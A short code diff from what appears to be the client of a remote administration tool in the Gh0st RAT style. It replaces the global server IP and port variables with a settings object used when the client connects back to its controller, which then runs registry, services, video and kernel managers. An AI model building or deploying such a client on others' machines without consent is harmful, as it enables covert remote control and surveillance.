@@ -10,10 +10,9 @@
 #include "RegisterManager.h"
 #include "ServicesManager.h"
 #include "VideoManager.h"
-#include "KernelManager.h"
+#include "KernelManager.h" 
 
-extern char  g_szServerIP[MAX_PATH];
-extern unsigned short g_uPort;  
+extern CONNECT_ADDRESS g_SETTINGS;
 
 HANDLE _CreateThread (LPSECURITY_ATTRIBUTES  SecurityAttributes,   
 					  SIZE_T dwStackSize,                                           
@@ -53,7 +52,7 @@ template <class Manager, int n> DWORD WINAPI LoopManager(LPVOID lParam)
 {
 	ThreadInfo *pInfo = (ThreadInfo *)lParam;
 	IOCPClient	*ClientObject = pInfo->p;
-	if (ClientObject->ConnectServer(g_szServerIP,g_uPort))
+	if (ClientObject->ConnectServer(g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort()))
 	{
 		Manager	m(ClientObject, n);
 		ClientObject->RunEventLoop(pInfo->run);
